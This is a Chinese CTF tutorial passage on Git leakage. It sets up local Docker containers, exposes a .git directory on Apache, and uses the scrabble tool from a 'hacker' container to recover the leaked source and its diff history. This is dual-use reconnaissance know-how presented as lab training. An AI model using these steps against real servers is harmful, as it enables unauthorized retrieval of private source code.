# §1 Web

## §1.1 信息搜集

```yaml
version: '3.2'

services:
  Chapter1_1:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest
    ports:
      - 80:80
```

### §1.1.1 Git泄漏

Git是一个主流的分布式版本控制系统，相关文件存在于`Workspace`根目录内的`./.git/`文件夹内。如果网站管理员上传源码时不注意，将`.git/`文件夹也上传到服务器的话，就能把其中的文件爬到本地，然后使用本地Git工具恢复源码。

现在市面上的相关工具大多可以集爬虫与Git还原于一身。这里我们使用的是Linux上的`scrabble`([GitHub仓库地址](https://github.com/denny0223/scrabble))。

这里我们使用Apache的Docker镜像创建服务器，并把预先准备好的`.git`文件夹导入容器内的`/var/www/html`目录内：

```shell
C:\CTF从0到1> cd .\1.1_Git泄漏\
C:\CTF从0到1\1.1_Git泄漏> Get-ChildItem -Hidden -Force
    Directory: C:\CTF从0到1\1.1_Git泄漏
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	d--h-           2022/2/28    18:55                .git # .git文件夹 
C:\CTF从0到1\1.1_Git泄漏> docker run -d -p 8000:80 --name git_divulge httpd:latest
	0d6b81e32a0b5348cfd43e0a4ea555297ece08735f925a00d784cd495596c1b8
C:\CTF从0到1\1.1_Git泄漏> docker exec git_divulge pwd
	/usr/local/apache2
C:\CTF从0到1\1.1_Git泄漏> docker exec git_divulge dir
	bin     build  cgi-bin  conf  error
	htdocs  icons  include  logs  modules
C:\CTF从0到1\1.1_Git泄漏> docker exec git_divulge ls ./htdocs -al
	total 16
	drwxr-xr-x 1 root     root     4096 Feb 28 11:25 .
	drwxr-xr-x 1 www-data www-data 4096 Dec 21 01:36 ..
	-rw-r--r-- 1      504 staff      45 Jun 11  2007 index.html
C:\CTF从0到1\1.1_Git泄漏> docker cp .\.git\ git_divulge:/usr/local/apache2/htdocs/
C:\CTF从0到1\1.1_Git泄漏> docker exec git_divulge ls ./htdocs -al
	total 20
	drwxr-xr-x 1 root     root     4096 Feb 28 11:25 .
	drwxr-xr-x 1 www-data www-data 4096 Dec 21 01:36 ..
	drwxr-xr-x 7 root     root     4096 Feb 28 10:55 .git
	-rw-r--r-- 1      504 staff      45 Jun 11  2007 index.html
C:\CTF从0到1\1.1_Git泄漏> curl localhost:8000
	<html>
		<body>
			<h1>It works!</h1>
		</body>
	</html>
C:\CTF从0到1\1.1_Git泄漏> curl localhost:8000/.git/
	<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
		<html>
 			<head>
  				<title>Index of /.git</title>
			</head>
			<body>
				<h1>Index of /.git</h1>
				<ul>
					<li><a href="/"> Parent Directory</a></li>
					<li><a href="COMMIT_EDITMSG"> COMMIT_EDITMSG</a></li>
					<li><a href="HEAD"> HEAD</a></li>
					<li><a href="ORIG_HEAD"> ORIG_HEAD</a></li>
					<li><a href="config"> config</a></li>
					<li><a href="description"> description</a></li>
					<li><a href="hooks/"> hooks/</a></li>
					<li><a href="index"> index</a></li>
					<li><a href="info/"> info/</a></li>
					<li><a href="logs/"> logs/</a></li>
					<li><a href="objects/"> objects/</a></li>
					<li><a href="refs/"> refs/</a></li>
				</ul>
			</body>
		</html>
```

接下来配置攻击端：

```shell
C:\CTF从0到1\1.1_Git泄漏> docker pull ubuntu
	Using default tag: latest
	latest: Pulling from library/ubuntu
	7b1a6ab2e44d: Pull complete
	Digest: sha256:626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322
	Status: Downloaded newer image for ubuntu:latest
	docker.io/library/ubuntu:latest
C:\CTF从0到1\1.1_Git泄漏> docker run -d --name hacker ubuntu:latest
	b62df4e3e89faaccb9d5ef0cca2f7c9b521fc1bf4ea526eb8699b4ec242cd92b
C:\CTF从0到1\1.1_Git泄漏> docker run -it --name hacker ubuntu:latest
	root@9b0bbe895f4a:/# exit
		exit
C:\CTF从0到1\1.1_Git泄漏> docker start hacker
	hacker
C:\CTF从0到1\1.1_Git泄漏> docker cp .\scrabble-master\ hacker:/home
C:\CTF从0到1\1.1_Git泄漏> docker attach hacker
	You cannot attach to a stopped container, start it first
C:\CTF从0到1\1.1_Git泄漏> docker attach hacker
	root@9b0bbe895f4a:/# cd home/
	root@9b0bbe895f4a:/home# ls
		scrabble-master
	root@9b0bbe895f4a:/home# apt-get update && apt-get install -y git curl wget tree
	root@9b0bbe895f4a:/home# cd scrabble-master/
	root@9b0bbe895f4a:/home/scrabble-master# ls
		LICENSE  README.md  scrabble
	root@9b0bbe895f4a:/home/scrabble-master# curl 172.17.0.1:8000/
		<html><body><h1>It works!</h1></body></html>
	root@9b0bbe895f4a:/home/scrabble-master# ./scrabble 172.17.0.1:8000/
		Reinitialized existing Git repository in /home/scrabble-master/.git/
		parseCommit f55c042245d07a5215ff5ae4246dba62d8458016
		downloadBlob f55c042245d07a5215ff5ae4246dba62d8458016
		parseTree c0114d8f3943302ad230e8cc8d727d1097512d3f
		downloadBlob c0114d8f3943302ad230e8cc8d727d1097512d3f
		# ...
		HEAD is now at f55c042 添加单元测试
	root@9b0bbe895f4a:/home/scrabble-master# ls
		LICENSE  README.md  app  dockerfile  scrabble
	root@9b0bbe895f4a:/home/scrabble-master# tree
		.
		|-- LICENSE
		|-- README.md
		|-- app
		|   |-- MainPage.html
		|   |-- identidock.py
		|   `-- tests.py
		|-- dockerfile
		`-- scrabble
	root@9b0bbe895f4a:/home/scrabble-master# git diff HEAD^ HEAD^^
		diff --git a/app/identidock.py b/app/identidock.py
		index 771edf5..ae60e8a 100644
		--- a/app/identidock.py
		+++ b/app/identidock.py
		
		@@ -1,8 +1,7 @@
		 from flask import Flask, Response, request
		 import requests
		-import redis
		 app = Flask(__name__)
		-cache = redis.StrictRedis(host='redis',port=6379,db=0)
		 username_test = 'Mike'
		 @app.route('/',methods=['GET','POST'])
		
		@@ -31,11 +30,8 @@ def hello_world():
		 @app.route('/monster/<name>')
		 def get_identicon(name):
		-    image = cache.get(name)
		-    if image is None:
		-        print("Cache miss")
		-        image = requests.get('http://dnmonster:8080/monster/'+name+'?size=80').content
		-        cache.set(name,image)
		+    request = requests.get('http://dnmonster:8080/monster/'+name+'?size=80')
		+    image = request.content
		     return Response(image,mimetype='image/png')
		 if __name__ == '__main__':
		diff --git a/dockerfile b/dockerfile
		index 7f39569..ceec2ea 100644
		--- a/dockerfile
		+++ b/dockerfile
		
		@@ -3,7 +3,6 @@ FROM python:3.7
		 RUN groupadd -r uwsgi && useradd -r -g uwsgi uwsgi
		 RUN pip install Flask
		 RUN pip install uWSGI requests
		-RUN pip install redis
		 WORKDIR /app
		 COPY app /app
		 EXPOSE 9090 9191
```

现实情况中，网站一般会配置禁止用户直接访问目录，而是只允许用户根据明确的路径获取文件。


